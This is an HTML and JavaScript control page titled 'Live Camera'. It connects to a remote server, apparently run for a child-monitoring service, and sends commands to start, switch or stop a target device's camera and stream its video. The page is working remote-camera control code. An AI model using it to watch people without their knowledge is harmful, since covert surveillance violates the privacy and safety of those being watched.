<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live Camera</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
:root {
    --bg: #000;
    --panel: #1c1c1e;
    --green: #30d158;
    --red: #ff453a;
    --blue: #0a84ff;
}

body {
    margin: 0;
    background: var(--bg);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    display: flex;
    justify-content: center;
}

.container {
    width: 100%;
    max-width: 480px;
    min-height: 100vh;
    background: #000;
    display: flex;
    flex-direction: column;
}

/* HEADER */
.header {
    padding: 14px;
    border-bottom: 1px solid rgba(255,255,255,0.1);
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.status {
    font-size: 12px;
    padding: 5px 12px;
    border-radius: 20px;
    background: var(--red);
    font-weight: 600;
}

.status.live {
    background: var(--green);
    color: #000;
}

/* VIDEO */
.video-box {
    flex: 1;
    background: black;
    display: flex;
    justify-content: center;
    align-items: center;
}

video {
    width: 100%;
    height: 100%;
    object-fit: contain;
}

/* CONTROLS */
.controls {
    padding: 16px;
    background: var(--panel);
    display: flex;
    gap: 12px;
}

.btn {
    flex: 1;
    border: none;
    border-radius: 14px;
    padding: 14px 0;
    font-size: 15px;
    font-weight: 700;
    color: white;
    cursor: pointer;
}

.start { background: var(--green); color:#000; }
.stop { background: var(--red); }
.switch { background: var(--blue); max-width:70px; }

@media (min-width: 700px) {
    .container {
        margin-top: 20px;
        border-radius: 18px;
        overflow: hidden;
        border: 1px solid rgba(255,255,255,0.15);
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="header">
        <span>Live Camera</span>
        <span id="status" class="status">OFFLINE</span>
    </div>

    <div class="video-box">
        <video id="remoteVideo" autoplay playsinline muted></video>
    </div>

    <div class="controls">
        <button class="btn start" onclick="sendCmd('start_video')">‚ñ∂ START</button>
        <button class="btn switch" onclick="sendCmd('switch_camera')">üîÑ</button>
        <button class="btn stop" onclick="sendCmd('stop_video')">‚èπ STOP</button>
    </div>

</div>

<script>
const SERVER = "https://child-v9no.onrender.com";
const params = new URLSearchParams(window.location.search);
const DEVICE_ID = params.get("id");

if(!DEVICE_ID){
    alert("Device ID missing!");
}

let socket;
let pc;

const config = {
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
};

socket = io(SERVER);

socket.on("connect", ()=>{
    socket.emit("join-room","ADMIN");
});

socket.on("offer", async (data)=>{
    pc = new RTCPeerConnection(config);

    pc.ontrack = e=>{
        const v = document.getElementById("remoteVideo");
        v.srcObject = e.streams[0] || new MediaStream([e.track]);
        setStatus(true);
    };

    pc.onicecandidate = e=>{
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    await pc.setRemoteDescription(data);
    const ans = await pc.createAnswer();
    await pc.setLocalDescription(ans);

    socket.emit("answer",{
        target: DEVICE_ID,
        sdp: ans.sdp
    });
});

socket.on("candidate", async d=>{
    if(pc){
        await pc.addIceCandidate(d);
    }
});

function sendCmd(cmd){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: cmd
    });

    if(cmd === "stop_video"){
        document.getElementById("remoteVideo").srcObject = null;
        setStatus(false);
        if(pc){ pc.close(); pc = null; }
    }
}

function setStatus(live){
    const s = document.getElementById("status");
    s.textContent = live ? "LIVE" : "OFFLINE";
    s.className = live ? "status live" : "status";
}
</script>

</body>
</html>
